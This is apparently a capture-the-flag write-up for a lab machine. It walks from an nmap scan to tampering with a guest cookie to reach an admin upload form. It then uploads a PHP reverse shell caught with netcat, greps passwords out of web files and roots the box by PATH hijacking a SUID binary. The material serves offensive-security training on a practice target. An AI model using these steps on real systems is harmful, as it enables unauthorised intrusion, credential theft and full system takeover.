# Enumeration

```shell
└─$ sudo nmap -sC -sV 10.129.251.56 -o nmap.txt 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-18 17:30 CEST
Nmap scan report for 10.129.251.56
Host is up (0.037s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.15 seconds
└─$ 
```

Check web site with browser, map site with burpsuite and detect /cdn-cgi/login/script.js.
Go to http://10.129.251.56/cdn-cgi/login/ and login with guest user, go to upload site and right click on browser and inspect element (q) in order to change cookie session. Got to storage and there are a guest cookie information (role and user values from guest user) go to http://10/129.251.56/cdn-cgi/login/admin.php?content=accounts&id=1 and see values for admin cookie session, change this values on firefox storage cookie session (34322 and admin) now we got access to upload form.

Copy /usr/share/webshells/php/php-reverse-shell.php to temporary location and change IP / PORT Values on it.

Upload file and after file uploaded check with gobuster where is uploaded file.
Start nc -lvnp 1234 on local machine ready for reverse shell and go to http://10.129.251.56/uploads/php-reverse-shell.php

execute ```shell python3 -c 'import pty;pty.spawn("/bin/bash")'``` command to improve shell environment.
get passwords with cat *|grep -i passw* on /var/www/html/cdn-cgi/login 
get robert passwords on cat db.php
check file /etc/passwd 

Find SUID files
```shell
find / -group bugtracker 2>/dev/null
strings /usr/bin/bugtracker|grep cat
echo "/bin/sh" > /tmp/cat
export PATH=/tmp:$PATH
bugtracker
```

get flags on /root /home/robert directories.
